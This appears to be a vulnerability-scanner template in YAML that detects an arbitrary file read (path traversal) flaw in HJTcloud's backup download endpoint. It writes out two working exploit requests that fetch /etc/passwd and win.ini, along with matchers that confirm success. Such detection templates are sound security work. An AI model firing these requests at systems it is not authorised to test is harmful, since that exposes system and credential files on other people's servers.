http:
- matchers:
  - condition: or
    regex:
    - 'root:.*:0:0:'
    - bit app support
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /fileDownload?action=downloadBackupFile HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/plain, */*

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    fullPath=/etc/passwd

    '
  - 'POST /fileDownload?action=downloadBackupFile HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/plain, */*

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    fullPath=/Windows/win.ini

    '
id: hjtcloud-arbitrary-file-read
info:
  author: pikpikcu
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: HJTcloud is vulnerable to local file inclusion.
  metadata:
    max-request: 2
  name: HJTcloud - Local File Inclusion
  reference:
  - https://mp.weixin.qq.com/s/w2pkj5ADN7b5uxe-wmfGbw
  severity: high
  tags: hjtcloud,lfi
